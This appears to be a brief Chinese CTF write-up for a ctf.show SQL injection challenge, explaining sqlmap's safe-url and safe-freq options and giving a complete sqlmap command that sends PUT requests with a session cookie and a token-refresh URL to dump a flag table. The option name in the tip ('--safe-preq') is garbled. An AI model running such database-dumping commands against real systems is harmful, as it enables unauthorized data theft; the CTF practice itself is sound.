# 知识点
### --safe-url    --safe-freq
--safe-url=SAFEURL  URL address to visit frequently during testing<br />--safe-req=SAFER..  Load safe HTTP request from a file
# 思路
别忘加上--safe-preq
```bash
sqlmap -u "http://cb73b752-fca2-4adb-9e92-cc71c923107d.challenge.ctf.show/api/index.php" --method="PUT" --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --cookie="PHPSESSID=60prkqe8189934t5pv3ikepa16" --safe-url="http://cb73b752-fca2-4adb-9e92-cc71c923107d.challenge.ctf.show/api/getToken.php" --safe-freq=1 -D ctfshow_web -T ctfshow_flax --dump
```
